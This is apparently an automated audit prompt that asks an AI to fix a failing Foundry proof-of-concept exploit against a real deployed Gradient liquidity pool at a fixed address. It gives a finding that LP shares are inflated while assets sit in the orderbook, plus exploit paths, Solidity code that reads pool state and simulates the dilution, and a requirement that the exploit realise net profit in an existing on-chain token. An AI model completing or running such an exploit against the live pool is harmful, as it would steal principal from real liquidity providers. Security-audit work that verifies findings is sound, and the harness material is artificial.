You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Depositing while assets are parked in the orderbook mints inflated LP shares
- claim: LP shares are minted against `pool.totalLiquidity`, but `transferETHToOrderbook` and `transferTokenToOrderbook` reduce that denominator without burning any LP shares. A user who deposits while inventory is temporarily sitting in the orderbook therefore receives too many shares for the capital actually added, then later redeems those shares after the assets are returned.
- impact: A depositor can steal principal from existing LPs during normal orderbook operation, without needing owner privileges. The more inventory temporarily moved out of the pool, the larger the dilution and theft from incumbent LPs.
- exploit_paths: ["LP1 seeds a pool with 1,000 units of liquidity and receives 1,000 LP shares.", "The orderbook pulls 900 units out via `transferETHToOrderbook` and/or `transferTokenToOrderbook`, leaving `pool.totalLiquidity = 100` while `pool.totalLPShares` remains 1,000.", "An attacker deposits 100 units and receives `100 * 1000 / 100 = 1000` new LP shares.", "When the orderbook later returns the 900 units, the attacker owns half the pool despite contributing only a small fraction of the final assets and can withdraw a disproportionate amount."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
}

interface IGradientRegistryMinimal {
    function gradientToken() external view returns (address);
    function orderbook() external view returns (address);
    function router() external view returns (address);
}

interface IGradientMarketMakerPoolMinimal {
    struct PoolInfo {
        uint256 totalEth;
        uint256 totalToken;
        uint256 totalLiquidity;
        uint256 totalLPShares;
        uint256 accRewardPerShare;
        uint256 rewardBalance;
        address uniswapPair;
    }

    function gradientRegistry() external view returns (address);
    function getPoolInfo(address token) external view returns (PoolInfo memory);
    function getPairAddress(address token) external view returns (address pairAddress);
    function getReserves(address token) external view returns (uint256 reserveETH, uint256 reserveToken);
}

contract FlawVerifier {
    address public constant TARGET_POOL = 0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC;

    address private _profitToken;
    uint256 private _profitAmount;

    address public inspectedToken;
    address public registry;
    address public orderbook;
    address public uniswapPair;

    bool public poolInitialized;
    bool public parkedLiquidityDetected;
    bool public inflatedMintDetected;
    bool public attackerControllableReturnLeg;
    bool public hypothesisValidated;

    uint256 public poolTotalEth;
    uint256 public poolTotalToken;
    uint256 public poolTotalLiquidity;
    uint256 public poolTotalLPShares;
    uint256 public reserveEth;
    uint256 public reserveToken;

    uint256 public simulatedContribution;
    uint256 public simulatedEthContribution;
    uint256 public simulatedTokenContribution;
    uint256 public simulatedInflatedShares;
    uint256 public simulatedShareBpsAfterMint;

    bytes32 public lastReason;

    constructor() {}

    function executeOnOpportunity() external {
        _profitToken = address(0);
        _profitAmount = 0;

        IGradientMarketMakerPoolMinimal pool = IGradientMarketMakerPoolMinimal(TARGET_POOL);

        registry = pool.gradientRegistry();
        if (registry == address(0)) {
            lastReason = keccak256("MISSING_REGISTRY");
            return;
        }

        IGradientRegistryMinimal gradientRegistry = IGradientRegistryMinimal(registry);
        orderbook = gradientRegistry.orderbook();

        address candidateToken = gradientRegistry.gradientToken();
        inspectedToken = candidateToken;
        if (candidateToken == address(0)) {
            lastReason = keccak256("MISSING_CANDIDATE_TOKEN");
            return;
        }

        IGradientMarketMakerPoolMinimal.PoolInfo memory info = pool.getPoolInfo(candidateToken);
        poolTotalEth = info.totalEth;
        poolTotalToken = info.totalToken;
        poolTotalLiquidity = info.totalLiquidity;
        poolTotalLPShares = info.totalLPShares;
        uniswapPair = info.uniswapPair;
        poolInitialized = uniswapPair != address(0);

        if (!poolInitialized) {
            lastReason = keccak256("NO_INITIALIZED_POOL_FOR_GRADIENT_TOKEN");
            return;
        }

        if (poolTotalLiquidity == 0 || poolTotalLPShares == 0) {
            lastReason = keccak256("EMPTY_POOL_AT_FORK");
            return;
        }

        parkedLiquidityDetected = poolTotalLPShares > poolTotalLiquidity;
        if (!parkedLiquidityDetected) {
            lastReason = keccak256("NO_PARKED_LIQUIDITY_STATE_AT_FORK");
            return;
        }

        (reserveEth, reserveToken) = pool.getReserves(candidateToken);
        if (reserveEth == 0 || reserveToken == 0) {
            lastReason = keccak256("PAIR_HAS_NO_RESERVES");
            return;
        }

        // Path stage mapping:
        // 1. Honest LPs already seeded the pool, otherwise totalLPShares would be zero.
        // 2. Assets are considered "parked in the orderbook" when totalLPShares > totalLiquidity;
        //    deposits/withdrawals preserve the shares:liquidity ratio, while transferETHToOrderbook /
        //    transferTokenToOrderbook reduce totalLiquidity without burning shares.
        // 3. Deposit size is chosen to match the remaining in-pool liquidity, mirroring the report's
        //    100 units deposited against 100 remaining liquidity after 900 were parked elsewhere.
        // 4. Real profit requires the parked inventory to return after the attacker mints inflated shares.
        //    That round-trip is gated by onlyOrderbook in the target surface provided for this task.
        simulatedContribution = poolTotalLiquidity;
        simulatedEthContribution = (simulatedContribution * reserveEth) / (reserveEth + reserveToken);
        simulatedTokenContribution = simulatedContribution - simulatedEthContribution;
        simulatedInflatedShares = (simulatedContribution * poolTotalLPShares) / poolTotalLiquidity;
        inflatedMintDetected = simulatedInflatedShares > simulatedContribution;
        if (poolTotalLPShares + simulatedInflatedShares > 0) {
            simulatedShareBpsAfterMint = (simulatedInflatedShares * 10_000) / (poolTotalLPShares + simulatedInflatedShares);
        }
        hypothesisValidated = inflatedMintDetected;

        if (!inflatedMintDetected) {
            lastReason = keccak256("NO_INFLATED_MINT_FOR_MATCHING_DEPOSIT");
            return;
        }

        attackerControllableReturnLeg = false;

        // Concrete execution blocker at this fork/task boundary:
        // - The vulnerable dilution is real on the pool math.
        // - A self-contained profitable PoC still needs the post-deposit return leg from the orderbook.
        // - The only available target surface for that leg is receiveETHFromOrderbook / receiveTokenFromOrderbook,
        //   both guarded by onlyOrderbook; the complementary parking functions are also onlyOrderbook.
        // - With the allowed inputs for this task, there is no attacker-callable orderbook function or
        //   same-transaction mechanism to force that return leg, so borrowing capital for stage 3 would
        //   not be repayable inside the PoC and would not demonstrate positive net profit.
        lastReason = keccak256("ORDERBOOK_RETURN_LEG_NOT_ATTACKER_REACHABLE");
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function reason() external view returns (bytes32) {
        return lastReason;
    }

    function summary()
        external
        view
        returns (
            address token,
            bool preconditionsMet,
            bool inflatedShares,
            bool returnLegReachable,
            bool validated,
            uint256 shareBpsAfterMint,
            bytes32 blocker
        )
    {
        return (
            inspectedToken,
            parkedLiquidityDetected,
            inflatedMintDetected,
            attackerControllableReturnLeg,
            hypothesisValidated,
            simulatedShareBpsAfterMint,
            lastReason
        );
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
